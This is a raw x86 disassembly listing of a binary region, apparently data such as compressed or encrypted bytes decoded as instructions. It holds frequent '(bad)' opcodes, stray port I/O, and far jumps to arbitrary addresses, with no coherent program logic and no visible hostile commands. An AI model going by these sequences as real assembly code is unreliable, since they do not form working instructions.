  42a020:	iret   
  42a021:	sbb    dh,al
  42a023:	aaa    
  42a024:	ss das 
  42a026:	iret   
  42a027:	sbb    al,0x4d
  42a029:	loope  0x429fad
  42a02b:	mov    eax,0x9822edf3
  42a030:	push   ds
  42a031:	in     eax,dx
  42a032:	sbb    cl,BYTE PTR [eax-0x44]
  42a035:	fs data16 loop 0x429fca
  42a039:	cmp    al,0x8b
  42a03b:	inc    esp
  42a03c:	in     al,0xe
  42a03e:	scas   eax,DWORD PTR es:[edi]
  42a03f:	xor    eax,0x28dd75dc
  42a044:	out    0xe3,eax
  42a046:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a047:	clc    
  42a048:	cmp    eax,0x27f81c8d
  42a04d:	mov    esi,cs
  42a04f:	or     eax,0x4eed4d20
  42a054:	add    ebx,DWORD PTR [ebp+0x7a2eda8e]
  42a05a:	(bad)  
  42a05c:	mov    ds:0x41119a03,al
  42a061:	or     eax,0x118cd8d3
  42a066:	xchg   esi,eax
  42a067:	cli    
  42a068:	sub    al,0x79
  42a06a:	outs   dx,BYTE PTR ds:[esi]
  42a06b:	xor    edx,DWORD PTR [ebp-0x7cbd2d19]
  42a071:	sbb    esp,DWORD PTR [eax]
  42a073:	mov    al,ds:0x25c52d89
  42a078:	sub    eax,0x89af9522
  42a07d:	outs   dx,BYTE PTR ds:[esi]
  42a07e:	leave  
  42a07f:	mov    ds:0x29718692,eax
  42a084:	push   cs
  42a085:	in     eax,dx
  42a086:	ins    DWORD PTR es:[edi],dx
  42a087:	jecxz  0x42a05c
  42a089:	call   0x25a:0x5266b1e4
  42a090:	icebp  
	...
  42a0f1:	add    BYTE PTR [eax],al
  42a0f3:	add    bh,dl
  42a0f5:	pushf  
  42a0f6:	shr    BYTE PTR [ebp-0x1000235],0xdb
  42a0fd:	call   FWORD PTR [ebx]
  42a0ff:	(bad)  
  42a100:	jp     0x42a164
  42a102:	cmp    ebx,edi
  42a104:	js     0x42a0c8
  42a106:	add    DWORD PTR [eax],eax
  42a108:	add    eax,0xc5000001
  42a10d:	mov    edi,0xaa2ada39
  42a112:	aad    0x4c
  42a114:	and    eax,0x75241ac
  42a119:	jmp    0x1cc0:0x4ef00b3d
  42a120:	bound  ecx,QWORD PTR [edi-0x693ca4f3]
  42a126:	or     cl,BYTE PTR [ebx+0x6b2475d4]
  42a12c:	call   0xf789681b
  42a131:	push   edi
  42a132:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a133:	test   al,0x42
  42a135:	cwde   
  42a136:	mov    BYTE PTR [esi-0x20],ch
  42a139:	xor    ah,BYTE PTR [eax+eax*4-0x2f]
  42a13d:	nop
  42a13e:	xor    al,0xfb
  42a140:	mov    dl,0xc6
  42a142:	out    0x64,eax
  42a144:	test   eax,0x8a8466c1
  42a149:	into   
  42a14a:	push   edi
  42a14b:	dec    edx
  42a14c:	mov    cl,0xe9
  42a14e:	shl    DWORD PTR fs:[ecx+edx*2],cl
  42a152:	mov    ch,0x56
  42a154:	add    bh,ah
  42a156:	and    ecx,DWORD PTR [edx]
  42a158:	mov    ch,0x71
  42a15a:	shl    BYTE PTR [edx-0x6d8505e7],cl
  42a160:	jmp    0x3878b037
  42a165:	lods   eax,DWORD PTR ds:[esi]
  42a166:	sub    DWORD PTR [esi+0x45],ecx
  42a169:	adc    DWORD PTR [esi-0x5a06d7ee],esi
  42a16f:	inc    edi
  42a170:	stos   DWORD PTR es:[edi],eax
  42a171:	push   esi
  42a172:	repz pusha 
  42a174:	ins    BYTE PTR es:[edi],dx
  42a175:	mov    ah,0x90
  42a177:	mov    ebx,0xfd7af11e
  42a17c:	sub    eax,0x927da32b
  42a181:	sar    al,cl
  42a183:	ficomp DWORD PTR [esi+0x4a7d20ed]
  42a189:	nop
  42a18a:	mov    ecx,0xcbd71422
  42a18f:	adc    cl,BYTE PTR [ebx]
  42a191:	mov    al,bl
  42a193:	pop    ebx
  42a194:	in     al,0x27
  42a196:	cmp    eax,0xb90eb4fe
  42a19b:	xor    al,0x88
  42a19d:	ss dec ecx
  42a19f:	mov    ss,WORD PTR [esi]
  42a1a1:	jl     0x42a1c0
  42a1a3:	sahf   
  42a1a4:	xlat   BYTE PTR ds:[ebx]
  42a1a5:	fcomp  QWORD PTR [esi+0x27183a4]
  42a1ab:	ret    0xbad2
  42a1ae:	adc    BYTE PTR [eax-0x208caaba],dh
  42a1b4:	or     ah,BYTE PTR [esi]
  42a1b6:	pop    eax
  42a1b7:	imul   BYTE PTR [edi-0xbf9fd35]
  42a1bd:	loopne 0x42a1ac
  42a1bf:	enter  0x94ac,0x45
  42a1c3:	arpl   bx,bp
  42a1c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a1c6:	xor    dh,BYTE PTR [ebx-0x46fa270b]
  42a1cc:	fcmovnu st,st(2)
  42a1ce:	out    dx,eax
  42a1cf:	mov    bh,0xa8
  42a1d1:	jecxz  0x42a15f
  42a1d3:	add    eax,ebx
  42a1d5:	fxch   st(5)
  42a1d7:	outs   dx,DWORD PTR ds:[esi]
  42a1d8:	cs inc eax
  42a1da:	mov    ds:0xd8c7f8c5,eax
  42a1df:	mov    BYTE PTR [edi-0x62a2314f],al
  42a1e5:	clc    
  42a1e6:	push   edi
  42a1e7:	jo     0x42a19f
  42a1e9:	data16 and BYTE PTR [esi+0x9],bh
  42a1ed:	sub    eax,0x4a2b6db8
  42a1f2:	call   DWORD PTR [eax]
  42a1f4:	jge    0x42a1ff
  42a1f6:	jge    0x42a1fc
  42a1f8:	push   ss
  42a1f9:	(bad)  
  42a1fa:	jmp    0x42a18c
  42a1fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a1fd:	mov    ecx,0xdf3388f0
  42a202:	add    cl,BYTE PTR [eax+esi*2-0x7f29c64a]
  42a209:	adc    al,0x2a
  42a20b:	mov    dh,BYTE PTR [edi+0x68]
  42a20e:	sub    edx,DWORD PTR [esi+0xa]
	...
  42a271:	add    BYTE PTR [eax],al
  42a273:	add    BYTE PTR [ebx],ch
  42a275:	test   DWORD PTR [ebp-0x50e640e7],edx
  42a27b:	mov    bh,0x1a
  42a27d:	aas    
  42a27e:	scas   al,BYTE PTR es:[edi]
  42a27f:	fldcw  WORD PTR [esi+0x7d19da9f]
  42a285:	ret    
  42a286:	add    DWORD PTR [eax],eax
  42a288:	add    eax,0xd2000001
  42a28d:	mov    eax,ds:0x1a34bbd1
  42a292:	add    DWORD PTR [edx-0x7690a0c1],0x5f1995f4
  42a29c:	sar    DWORD PTR ss:[edx+ebp*1-0x39],1
  42a2a1:	(bad)
  42a2a5:	mul    BYTE PTR [ecx+0x7862a3ec]
  42a2ab:	inc    esp
  42a2ac:	jno    0x42a2a7
  42a2ae:	inc    eax
  42a2af:	sar    DWORD PTR [esi-0x74],1
  42a2b2:	mov    BYTE PTR [eax-0x35],bh
  42a2b5:	jp     0x42a24b
  42a2b7:	add    DWORD PTR [ecx+0x5d],0xf4d2f56d
  42a2be:	dec    ecx
  42a2bf:	xchg   ebx,eax
  42a2c0:	(bad)  
  42a2c1:	sbb    ebp,esi
  42a2c3:	add    BYTE PTR [ebp-0x48],0x34
  42a2c7:	jo     0x42a2e0
  42a2c9:	(bad)  
  42a2cb:	cmc    
  42a2cc:	xchg   BYTE PTR [ebp-0x446be94c],al
  42a2d2:	mov    esp,0x3b949b35
  42a2d7:	out    0xe1,eax
  42a2d9:	xchg   DWORD PTR [eax-0x6b901673],edi
  42a2df:	mov    ebp,0xa2d173fc
  42a2e4:	pop    ds
  42a2e5:	(bad)  
  42a2e6:	xchg   ebp,eax
  42a2e7:	fwait
  42a2e8:	sbb    DWORD PTR [ecx+edi*2-0x51],edx
  42a2ec:	sbb    al,cl
  42a2ee:	in     eax,0xf6
  42a2f0:	out    dx,al
  42a2f1:	(bad)  
  42a2f3:	add    al,0x87
  42a2f5:	repz push 0x32
  42a2f8:	popa   
  42a2f9:	and    ch,ch
  42a2fb:	cmp    DWORD PTR [ebx],0xf9ac5ef7
  42a301:	ret    0x3a2e
  42a304:	stos   BYTE PTR es:[edi],al
  42a305:	add    al,0xa2
  42a307:	mov    edx,0xe84336d5
  42a30c:	jle    0x42a36a
  42a30e:	inc    edi
  42a30f:	adc    ah,BYTE PTR cs:[si+0x2243]
  42a315:	fwait
  42a316:	push   ecx
  42a317:	addr16 int3 
  42a319:	adc    eax,0x416d6fde
  42a31e:	std    
  42a31f:	and    eax,0xd3350db6
  42a324:	pop    esi
  42a325:	cmp    DWORD PTR [ebx+0x70],eax
  42a328:	or     BYTE PTR [esi+0x2783f39b],0xdd
  42a32f:	imul   bh
  42a331:	gs jnp 0x42a357
  42a334:	jle    0x42a2d3
  42a336:	jb     0x42a345
  42a338:	adc    ebp,DWORD PTR [esi+0x74]
  42a33b:	and    DWORD PTR [edi+0x65eda1cb],0x10bc52cb
  42a345:	xchg   edi,eax
  42a346:	popf   
  42a347:	aaa    
  42a348:	dec    edi
  42a349:	cwde   
  42a34a:	fisub  WORD PTR [ebx-0x2f]
  42a34d:	loope  0x42a2f5
  42a34f:	test   DWORD PTR [edx],edx
  42a351:	arpl   WORD PTR [edi+0x27],cx
  42a354:	stos   BYTE PTR es:[edi],al
  42a355:	add    BYTE PTR [edi+0x67],dl
  42a358:	sub    al,0x58
  42a35a:	shl    ecx,0xe5
  42a35d:	mul    BYTE PTR [ebp-0x56]
  42a360:	jo     0x42a35a
  42a362:	hlt    
  42a363:	lahf   
  42a364:	inc    eax
  42a365:	add    ecx,DWORD PTR [ecx-0x46]
  42a368:	xor    eax,0xfc92a415
  42a36d:	outs   dx,DWORD PTR ds:[esi]
  42a36e:	outs   dx,BYTE PTR ds:[esi]
  42a36f:	shl    DWORD PTR [esi+edx*4],0x42
  42a373:	pop    edi
  42a374:	test   BYTE PTR [esi+0x396ae2],bh
  42a37a:	adc    BYTE PTR [esi+0x653134dc],0xef
  42a381:	test   DWORD PTR [edx-0x49],esp
  42a384:	dec    esi
  42a385:	jecxz  0x42a370
  42a387:	stc    
  42a388:	lahf   
  42a389:	sub    al,0x33
  42a38b:	sbb    eax,0xd5834291
  42a390:	cdq    
	...
  42a3f1:	add    BYTE PTR [eax],al
  42a3f3:	add    BYTE PTR [edi+0xe],bh
  42a3f6:	jne    0x42a433
  42a3f8:	jne    0x42a475
  42a3fa:	jg     0x42a44a
  42a3fc:	loop   0x42a467
  42a3fe:	mov    ebp,0xd51b053d
  42a403:	pop    es
  42a404:	add    ah,0x1
  42a407:	add    BYTE PTR ds:0xb9000001,al
  42a40d:	scas   eax,DWORD PTR es:[edi]
  42a40e:	jg     0x42a419
  42a410:	popa   
  42a411:	fldcw  WORD PTR [ecx+edx*2+0x102033ef]
  42a418:	int3   
  42a419:	cmp    eax,0xdd9c3477
  42a41e:	push   es
  42a41f:	scas   al,BYTE PTR es:[edi]
  42a420:	vandps xmm3,xmm0,xmm4
  42a424:	dec    edx
  42a425:	jl     0x42a445
  42a427:	add    BYTE PTR [esi-0x3c24200f],cl
  42a42d:	shl    esi,1
  42a42f:	mov    BYTE PTR [edi-0x59822840],dh
  42a435:	dec    eax
  42a436:	mov    esp,0xcb987dc8
  42a43b:	cld    
  42a43c:	ror    BYTE PTR [edx],0xa9
  42a43f:	or     DWORD PTR [eax-0x51deef96],0x58
  42a446:	cmp    dl,BYTE PTR [ebp-0x34]
  42a449:	add    BYTE PTR [esi+0x8],dl
  42a44c:	sbb    edi,DWORD PTR [esi-0x6f144428]
  42a452:	sbb    BYTE PTR [ebx-0x7743bbda],0xf7
  42a459:	out    dx,eax
  42a45a:	push   es
  42a45b:	(bad)  
  42a45c:	cwde   
  42a45d:	mul    DWORD PTR [eax]
  42a45f:	stos   BYTE PTR es:[edi],al
  42a460:	sbb    ch,BYTE PTR [eax+edi*1]
  42a463:	add    DWORD PTR [edx-0x503324a2],edi
  42a469:	pushf  
  42a46a:	fldcw  WORD PTR [eax-0xe]
  42a46d:	cld    
  42a46e:	shr    DWORD PTR [esi],0x8f
  42a471:	mov    esi,0x549485d
  42a476:	inc    edi
  42a477:	aam    0x4e
  42a479:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a47a:	je     0x42a4fb
  42a47c:	je     0x42a411
  42a47e:	inc    ecx
  42a47f:	jecxz  0x42a4a7
  42a481:	sahf   
  42a482:	adc    edx,DWORD PTR [ecx+ecx*8-0x5f]
  42a486:	and    BYTE PTR [esi+0x4d],al
  42a489:	push   edx
  42a48a:	xor    DWORD PTR [edx-0xe9498cf],ebp
  42a490:	stos   DWORD PTR es:[edi],eax
  42a491:	sub    dl,dh
  42a493:	cmc    
  42a494:	inc    esp
  42a495:	into   
  42a496:	and    ecx,DWORD PTR ds:0x919f34bf
  42a49c:	push   edx
  42a49d:	mov    ds:0x8837fbfc,eax
  42a4a2:	or     ecx,DWORD PTR [edx-0x42]
  42a4a5:	mov    ds:0x94a5db60,al
  42a4aa:	mov    ah,0x4c
  42a4ac:	push   edi
  42a4ad:	xchg   BYTE PTR [ecx+ecx*4+0x2],al
  42a4b1:	mov    bl,0x75
  42a4b3:	sahf   
  42a4b4:	(bad)  
  42a4b5:	stc    
  42a4b6:	adc    DWORD PTR [eax+0x72],ebp
  42a4b9:	int3   
  42a4ba:	cld    
  42a4bb:	(bad)  
  42a4bc:	scas   eax,DWORD PTR es:[edi]
  42a4bd:	jns    0x42a44e
  42a4bf:	xchg   BYTE PTR [ebp-0x4b],ch
  42a4c2:	jmp    0x62572047
  42a4c7:	mov    edi,edi
  42a4c9:	lods   eax,DWORD PTR ds:[esi]
  42a4ca:	lds    ecx,FWORD PTR [edi-0x1d]
  42a4cd:	stos   BYTE PTR es:[edi],al
  42a4ce:	retf   0xa52
  42a4d1:	in     eax,dx
  42a4d2:	popf   
  42a4d3:	lea    ecx,[edx+0x2f8035b3]
  42a4d9:	mov    esi,0xdbce8d8f
  42a4de:	xor    bh,BYTE PTR ds:0xea69889f
  42a4e4:	ret    0xe40f
  42a4e7:	les    edi,FWORD PTR [esi-0xc350751]
  42a4ed:	lods   eax,DWORD PTR ds:[esi]
  42a4ee:	sbb    eax,DWORD PTR [edi-0x45]
  42a4f1:	outs   dx,BYTE PTR ds:[esi]
  42a4f2:	daa    
  42a4f3:	inc    esi
  42a4f4:	mov    esp,0x9fd08a11
  42a4f9:	dec    ecx
  42a4fa:	jno    0x42a4df
  42a4fc:	ret    0x6b7a
  42a4ff:	sbb    al,0xab
  42a501:	popf   
  42a502:	and    BYTE PTR [edi+0x2d],dh
  42a505:	rol    BYTE PTR ds:0x6e6268a8,1
  42a50b:	out    0x8c,al
  42a50d:	sub    eax,0xbad176
	...
  42a572:	add    BYTE PTR [eax],al
  42a574:	sbb    BYTE PTR [edi+0x17],cl
  42a577:	mov    ecx,0xefbef957
  42a57c:	(bad)  
  42a57d:	cmc    
  42a57e:	mov    edx,0x6dfab19f
  42a583:	fld    QWORD PTR [edi+0x50001c5]
  42a589:	add    DWORD PTR [eax],eax
  42a58b:	add    BYTE PTR [esi+0x36],bl
  42a58e:	into   
  42a58f:	jg     0x42a5a1
  42a591:	rep outs dx,DWORD PTR ds:[esi]
  42a593:	in     al,dx
  42a594:	sub    eax,0xaa650ea3
  42a599:	inc    esi
  42a59a:	or     DWORD PTR [ecx+0x3f2be88a],esi
  42a5a0:	into   
  42a5a1:	mov    ds:0x2016ec3c,al
  42a5a6:	stos   BYTE PTR es:[edi],al
  42a5a7:	dec    edx
  42a5a8:	ror    BYTE PTR [ecx+0x725ef83c],cl
  42a5ae:	les    ebx,FWORD PTR [edx]
  42a5b0:	sbb    bl,BYTE PTR [edx+0x14]
  42a5b3:	dec    edi
  42a5b4:	mov    eax,ds:0x40d16172
  42a5b9:	pop    eax
  42a5ba:	(bad)  
  42a5bb:	jmp    0x42a5af
  42a5bd:	sahf   
  42a5be:	add    ch,al
  42a5c0:	call   0xc8200035
  42a5c5:	pop    ecx
  42a5c6:	xor    DWORD PTR [esi+edx*2-0x68eff545],eax
  42a5cd:	xchg   esp,eax
  42a5ce:	popf   
  42a5cf:	sub    DWORD PTR [esi+0x64],eax
  42a5d2:	jae    0x42a583
  42a5d4:	arpl   WORD PTR [eax+0x688a2a62],ax
  42a5da:	pushf  
  42a5db:	ret    0x95ad
  42a5de:	inc    eax
  42a5df:	arpl   WORD PTR ds:0x751e9132,sp
  42a5e5:	add    esp,eax
  42a5e7:	fistp  QWORD PTR [edi]
  42a5e9:	into   
  42a5ea:	mov    dh,0xb5
  42a5ec:	lock repz (bad) 
  42a5ef:	xor    al,0x3
  42a5f1:	jbe    0x42a644
  42a5f3:	stc    
  42a5f4:	mov    dl,0xd3
  42a5f6:	add    ah,BYTE PTR [ebx-0x24b6c197]
  42a5fc:	xor    ecx,esp
  42a5fe:	and    BYTE PTR [ecx+ecx*8],dl
  42a601:	xchg   DWORD PTR [ebx-0x51],edi
  42a604:	fs push 0x5d
  42a607:	inc    ebx
  42a608:	daa    
  42a609:	lods   eax,DWORD PTR ds:[esi]
  42a60a:	add    ch,ah
  42a60c:	add    DWORD PTR [ebx],0xffffffe2
  42a60f:	das    
  42a610:	push   edx
  42a611:	xchg   DWORD PTR [edi-0x58b0ae55],eax
  42a617:	sub    cl,cl
  42a619:	popf   
  42a61a:	jnp    0x42a5ff
  42a61c:	pop    ds
  42a61d:	stos   DWORD PTR es:[edi],eax
  42a61e:	inc    edx
  42a61f:	jbe    0x42a5b9
  42a621:	scas   al,BYTE PTR es:[edi]
  42a622:	aaa    
  42a623:	cli    
  42a624:	nop
  42a625:	pop    ebx
  42a626:	adc    ebp,DWORD PTR ds:0xfe607c8
  42a62c:	frstor [ebx-0x508e0c8f]
  42a632:	and    cl,bh
  42a634:	fcmovu st,st(3)
  42a636:	pop    esi
  42a637:	test   al,0xf3
  42a639:	pop    edx
  42a63a:	aaa    
  42a63b:	pop    esp
  42a63c:	add    eax,0xb566f210
  42a641:	pop    ds
  42a642:	test   BYTE PTR ds:0xb1827bf8,bh
  42a648:	idiv   DWORD PTR [esi-0x41]
  42a64b:	(bad)  
  42a64c:	in     al,dx
  42a64d:	das    
  42a64e:	push   ebp
  42a64f:	mov    BYTE PTR [esi-0x5a],ch
  42a652:	or     edx,DWORD PTR [eax+0x491df6cf]
  42a658:	mov    ds:0x581e8b0f,eax
  42a65d:	scas   eax,DWORD PTR es:[edi]
  42a65e:	mov    ds:0xa4dee242,al
  42a663:	rcl    DWORD PTR [ecx-0x4c837e],1
  42a669:	out    0xe9,al
  42a66b:	mov    bh,0xfa
  42a66d:	stc    
  42a66e:	addr16 jne 0x42a6d6
  42a671:	or     al,0xc5
  42a673:	or     eax,DWORD PTR [eax+esi*8]
  42a676:	mov    bh,0xae
  42a678:	repnz sar ch,cl
  42a67b:	leave  
  42a67c:	test   BYTE PTR [esi+ecx*8],al
  42a67f:	xchg   esp,eax
  42a680:	in     al,0x1c
  42a682:	adc    eax,0x8d03639b
  42a687:	pusha  
  42a688:	adc    eax,0x2e88ad95
  42a68d:	ror    dl,0xe5
  42a690:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
	...
  42a6f1:	add    BYTE PTR [eax],al
  42a6f3:	add    BYTE PTR [esi+edx*1],ah
  42a6f6:	outs   dx,BYTE PTR ds:[esi]
  42a6f7:	(bad)  
  42a6f8:	jle    0x42a6f9
  42a6fa:	lods   eax,DWORD PTR ds:[esi]
  42a6fb:	test   DWORD PTR [edi+0x3b8131c],0x8cb21c77
  42a705:	mov    BYTE PTR [ecx],0x0
  42a708:	add    eax,0xc0000001
  42a70d:	sbb    eax,ebp
  42a70f:	fcmovnu st,st(4)
  42a711:	mov    ds:0xe0dcdc70,eax
  42a716:	mov    al,ds:0x16a1e442
  42a71b:	mov    eax,0x32a60fcb
  42a720:	popa   
  42a721:	cs pop es
  42a723:	pushf  
  42a724:	sbb    eax,0x29efb83f
  42a729:	out    dx,eax
  42a72a:	xor    ah,BYTE PTR [ecx+0x42]
  42a72d:	gs shl eax,1
  42a730:	imul   ebx,DWORD PTR [esi+edi*4-0x71],0x14efdbc1
  42a738:	jl     0x42a704
  42a73a:	(bad)
  42a73f:	nop
  42a740:	or     al,0x55
  42a742:	and    al,0x6e
  42a744:	push   0xc2ef86f9
  42a749:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a74a:	test   al,0x82
  42a74c:	inc    ebp
  42a74d:	push   ds
  42a74e:	mov    ch,0x1c
  42a750:	call   0x5642dc56
  42a755:	mov    esi,0xb9a5ddcd
  42a75a:	inc    edx
  42a75b:	dec    edi
  42a75c:	int3   
  42a75d:	jl     0x42a7ae
  42a75f:	or     bl,BYTE PTR [edi]
  42a761:	xchg   ch,dh
  42a763:	jmp    0xded4:0x42b6803e
  42a76a:	fbld   TBYTE PTR [ecx+esi*1+0x320072e8]
  42a771:	aas    
  42a772:	fsubr  DWORD PTR [esi-0x37]
  42a775:	or     edx,edi
  42a777:	push   0xffffff97
  42a779:	call   0x6fdf820b
  42a77e:	jecxz  0x42a7fb
  42a780:	push   ebp
  42a781:	or     DWORD PTR [ebx+0x41],edx
  42a784:	outs   dx,DWORD PTR ds:[esi]
  42a785:	(bad)  
  42a786:	enter  0x4665,0x8e
  42a78a:	out    0xe7,al
  42a78c:	int    0x19
  42a78e:	inc    eax
  42a78f:	sbb    al,0x74
  42a791:	retf   
  42a792:	xor    ecx,eax
  42a794:	push   eax
  42a795:	scas   al,BYTE PTR es:[edi]
  42a796:	sub    al,0x2f
  42a798:	push   eax
  42a799:	(bad)  [esi-0x18]
  42a79c:	cmp    BYTE PTR [ecx-0x42d435f9],cl
  42a7a2:	inc    ecx
  42a7a3:	push   es
  42a7a4:	dec    ebx
  42a7a5:	dec    esp
  42a7a6:	and    BYTE PTR [ebx-0xeb51990],bh
  42a7ac:	fisttp QWORD PTR [edi-0xc95b5d9]
  42a7b2:	jno    0x42a7d6
  42a7b4:	dec    esp
  42a7b5:	pop    esp
  42a7b6:	push   ebx
  42a7b7:	popa   
  42a7b8:	imul   eax,DWORD PTR [ebp-0x3c],0x72dc6199
  42a7bf:	push   edi
  42a7c0:	fidiv  DWORD PTR [edx+0x7569ac0]
  42a7c6:	sar    DWORD PTR [edx],cl
  42a7c8:	and    DWORD PTR cs:[edi+0x2389946b],ecx
  42a7cf:	xor    DWORD PTR [ebx-0x47a4f8bb],ecx
  42a7d5:	rcl    DWORD PTR [esp+ebp*2-0x76155eba],0xef
  42a7dd:	inc    edi
  42a7de:	iret   
  42a7df:	xchg   ebp,eax
  42a7e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a7e1:	and    BYTE PTR [ecx-0x71],ah
  42a7e4:	inc    ebp
  42a7e5:	adc    al,0xb6
  42a7e7:	mov    cl,0x43
  42a7e9:	mov    al,ds:0x62c6f6c2
  42a7ee:	cld    
  42a7ef:	(bad)  
  42a7f0:	push   0xfeef9d46
  42a7f5:	push   eax
  42a7f6:	inc    ebx
  42a7f7:	nop
  42a7f8:	call   0xc9f1c1bc
  42a7fd:	jnp    0x42a7f8
  42a7ff:	out    dx,al
  42a800:	ror    DWORD PTR [ebx],cl
  42a802:	scas   eax,DWORD PTR es:[edi]
  42a803:	push   0x485fc479
  42a808:	pusha  
  42a809:	stc    
  42a80a:	in     eax,dx
  42a80b:	imul   ebp,DWORD PTR [ecx+0x60],0xffffffe3
  42a80f:	lahf   
  42a810:	rol    BYTE PTR [eax],1
	...
  42a872:	add    BYTE PTR [eax],al
  42a874:	mov    ah,BYTE PTR [ebp+0x63]
  42a877:	mov    edi,0x75debfef
  42a87c:	add    ebp,0x1c0d6c97
  42a882:	pop    ebx
  42a883:	inc    esi
  42a884:	xchg   ecx,eax
  42a885:	mov    DWORD PTR [ecx],0x10500
  42a88b:	add    ah,ch
  42a88d:	jl     0x42a8b0
  42a88f:	data16 jne 0x42a845
  42a892:	cmp    ah,BYTE PTR [esi]
  42a894:	mov    WORD PTR [ecx],fs
  42a896:	push   ss
  42a897:	sbb    BYTE PTR [esi],ch
  42a899:	daa    
  42a89a:	popf   
  42a89b:	ret    
  42a89c:	mov    bh,0xa3
  42a89e:	mov    al,ds:0x8935fccd
  42a8a3:	add    eax,0x78f71d76
  42a8a8:	xchg   ecx,eax
  42a8a9:	addr16 in al,dx
  42a8ab:	mov    ds:0x54999aab,al
  42a8b0:	push   ss
  42a8b1:	pop    ebp
  42a8b2:	inc    ecx
  42a8b3:	and    dl,bh
  42a8b5:	pop    esi
  42a8b6:	pop    ds
  42a8b7:	jnp    0x42a86f
  42a8b9:	push   edx
  42a8ba:	popa   
  42a8bb:	addr16 dec esp
  42a8bd:	fbstp  TBYTE PTR [edi+0x3a]
  42a8c0:	jb     0x42a865
  42a8c2:	xchg   ecx,eax
  42a8c3:	fcom   QWORD PTR [ebx]
  42a8c5:	push   edx
  42a8c6:	or     DWORD PTR [ecx-0x2ef7487],ecx
  42a8cc:	mov    cl,ch
  42a8ce:	and    eax,0x2cad754a
  42a8d3:	in     eax,0xd1
  42a8d5:	(bad)
  42a8d8:	push   eax
  42a8d9:	bound  esi,QWORD PTR [ebp+0x68]
  42a8dc:	ss mov edi,0xac476bac
  42a8e2:	pop    edi
  42a8e3:	dec    ebp
  42a8e4:	lock ret 0x23a
  42a8e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a8e9:	cmp    eax,0xf34f1d4a
  42a8ee:	out    0x30,eax
  42a8f0:	adc    eax,0xd421ba75
  42a8f5:	shl    dh,0x94
  42a8f8:	les    ecx,FWORD PTR [eax+0xa8ad5f1]
  42a8fe:	call   0x749b:0xbfaa3961
  42a905:	mov    dl,0xc7
  42a907:	xchg   DWORD PTR [ebx],ebx
  42a909:	dec    edi
  42a90a:	xor    DWORD PTR [esi-0x2c06f049],edx
  42a910:	leave  
  42a911:	ja     0x42a89a
  42a913:	push   cs
  42a914:	mov    WORD PTR [esi],fs
  42a916:	xchg   ebx,eax
  42a917:	imul   edx,DWORD PTR [ebx+0x2f],0xfffffff0
  42a91b:	call   0x163a7d35
  42a920:	es (bad) 
  42a922:	int    0x67
  42a924:	jnp    0x42a90b
  42a926:	outs   dx,DWORD PTR ds:[esi]
  42a927:	iret   
  42a928:	jmp    0x42a987
  42a92a:	inc    eax
  42a92b:	xchg   BYTE PTR [edx+0x1f],cl
  42a92e:	or     dl,BYTE PTR ss:[eax-0xe]
  42a932:	push   edx
  42a933:	imul   esp,DWORD PTR [esi-0xc29ec64],0xffffffa1
  42a93a:	jnp    0x42a93a
  42a93c:	adc    ebp,esp
  42a93e:	or     al,0xf4
  42a940:	xchg   DWORD PTR [edx],eax
  42a942:	jl     0x42a92e
  42a944:	sbb    DWORD PTR [ebp-0x1101e05a],edx
  42a94a:	mov    ebp,0xbce4f54e
  42a94f:	jmp    0x42a963
  42a951:	cwde   
  42a952:	(bad)  
  42a953:	loope  0x42a9a1
  42a955:	dec    ebx
  42a956:	adc    BYTE PTR [ebp+0x7b6b9341],0xdf
  42a95d:	jl     0x42a9a2
  42a95f:	xchg   ebp,eax
  42a960:	lods   al,BYTE PTR ds:[esi]
  42a961:	sub    al,0x64
  42a963:	les    edx,FWORD PTR [ebp-0x5b45ec8c]
  42a969:	iret   
  42a96a:	imul   edi
  42a96c:	pop    ebx
  42a96d:	jo     0x42a9a6
  42a96f:	loop   0x42a93c
  42a971:	xchg   ecx,eax
  42a972:	or     BYTE PTR [eax+0x54941a46],dl
  42a978:	adc    dl,BYTE PTR [ecx]
  42a97a:	jmp    0x42a9b5
  42a97c:	sbb    eax,0x576cdc1c
  42a981:	shr    DWORD PTR [ebx],0x5
  42a984:	pop    ss
  42a985:	inc    esp
  42a986:	icebp  
  42a987:	jmp    0x55c9:0x97caa423
  42a98e:	fcom   DWORD PTR [eax+0x9b]
	...
  42a9f4:	test   al,0x93
  42a9f6:	sbb    eax,0xfbee3fee
  42a9fb:	xlat   BYTE PTR ds:[ebx]
  42a9fc:	in     eax,0xd3
  42a9fe:	aad    0x7
  42aa00:	dec    ecx
  42aa01:	pop    ds
  42aa02:	pop    ds
  42aa03:	inc    esp
  42aa04:	xchg   esi,eax
  42aa05:	enter  0x1,0x5
  42aa09:	add    DWORD PTR [eax],eax
  42aa0b:	add    BYTE PTR [edx],al
  42aa0d:	out    dx,eax
  42aa0e:	xchg   edi,eax
  42aa0f:	dec    esp
  42aa10:	mov    ?,WORD PTR [esi]
  42aa12:	push   edi
  42aa13:	or     edx,DWORD PTR [esi-0x4b794c04]
  42aa19:	out    0xd7,eax
  42aa1b:	sbb    bh,BYTE PTR [eax+0x37f73e73]
  42aa21:	xchg   ecx,eax
  42aa22:	leave  
  42aa23:	inc    esp
  42aa24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42aa25:	mov    WORD PTR [ecx+0x38],gs
  42aa28:	retf   
  42aa29:	and    BYTE PTR [edi+0x4b],bh
  42aa2c:	push   edx
  42aa2d:	inc    DWORD PTR [edi]
  42aa2f:	cmc    
  42aa30:	stc    
  42aa31:	or     al,0x6a
  42aa33:	cmp    al,0x92
  42aa35:	pop    ebx
  42aa36:	test   DWORD PTR ds:0x111bbd90,esp
  42aa3c:	push   cs
  42aa3d:	pusha  
  42aa3e:	out    0xce,eax
  42aa40:	push   0x5b
  42aa42:	nop
  42aa43:	jb     0x42aa98
  42aa45:	outs   dx,BYTE PTR ds:[esi]
  42aa46:	xchg   BYTE PTR [ecx+ecx*8+0x701e5ebd],bh
  42aa4d:	(bad)  
  42aa4e:	popf   
  42aa4f:	test   DWORD PTR [esi+0x9],0x7a99825b
  42aa56:	pop    esi
  42aa57:	mov    edi,0x3d11a327
  42aa5c:	adc    al,0xeb
